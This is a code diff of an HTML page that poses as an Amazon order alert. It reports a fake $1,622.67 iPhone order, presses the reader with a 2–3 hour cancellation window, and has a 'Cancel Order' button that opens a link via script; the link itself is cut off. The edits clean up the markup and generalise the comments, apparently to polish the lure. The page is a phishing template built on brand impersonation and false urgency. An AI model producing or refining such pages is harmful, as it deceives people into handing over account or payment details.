@@ -24,7 +24,7 @@ body {
   color: var(--text);
 }
 
-/* LIGHT HEADER */
+/* HEADER */
 header {
   background: white;
   padding: 18px 0;
@@ -156,7 +156,6 @@ button:active {
   .card {
     padding: 22px;
   }
-
   button {
     width: 100%;
   }
@@ -166,21 +165,20 @@ button:active {
 
 <body>
 
-<!-- LIGHT HEADER WITH CENTER LOGO -->
+<!-- HEADER -->
 <header>
-  <!-- Replace this logo later -->
   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
 </header>
 
-<!-- ALERT STRIP -->
-<div class="alert"><strong>
-Order Activity Update
-</strong></div><strong>
+<!-- ALERT -->
+<div class="alert">
+  <strong>Order Activity Update</strong>
+</div>
 
-</strong><div class="container"><strong>
-  </strong><div class="card"><strong>
+<div class="container">
+  <div class="card">
 
-    </strong><h1>Order Placed on Your Account</h1>
+    <h1>Order Placed on Your Account</h1>
 
     <div class="subtitle">
       An order has recently been placed using your Aman.com account.
@@ -192,23 +190,23 @@ Order Activity Update
     <div class="order-box">
 
       <div class="order-row">
-        <strong style="width: 104px; height: 20px;">Order ID</strong>
-        <span><font size="3">#402-9384756-1192834</font></span>
+        <strong>Order ID</strong>
+        <span>#402-9384756-1192834</span>
       </div>
 
       <div class="order-row">
         <strong>Product</strong>
-        <span><font size="3">iPhone 17 Pro Max</font></span>
+        <span>iPhone 17 Pro Max</span>
       </div>
 
       <div class="order-row">
         <strong>Order Amount</strong>
-        <span><font size="3">$1,622.67</font></span>
+        <span>$1,622.67</span>
       </div>
 
       <div class="order-row">
         <strong>Payment Status</strong>
-        <span><font size="3">Processed</font></span>
+        <span>Processed</span>
       </div>
 
     </div>
@@ -220,14 +218,14 @@ Order Activity Update
       expected to arrive within <strong>7 days</strong>.
     </div>
 
-    <!-- CANCELLATION WINDOW -->
+    <!-- NOTICE -->
     <div class="notice">
       You may cancel this order within the next
       <strong>2–3 hours</strong> before shipment processing is finalized.
       Once dispatched, cancellation may no longer be available.
     </div>
 
-    <!-- CANCEL BUTTON -->
+    <!-- BUTTON -->
     <div class="actions">
       <button onclick="openCancelLink()">
         Cancel Order
@@ -235,13 +233,12 @@ Order Activity Update
     </div>
 
     <div class="footer">
-      © 2026 Amazon.com, Inc. All rights reserved.
-    </div>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ©2026 Amazon.com, Inc. or its affiliates. All rights reserved.<br></div>
 
   </div>
 </div>
 
-<!-- BUTTON LINK SCRIPT -->
+<!-- SCRIPT -->
 <script>
 function openCancelLink() {
   window.open(
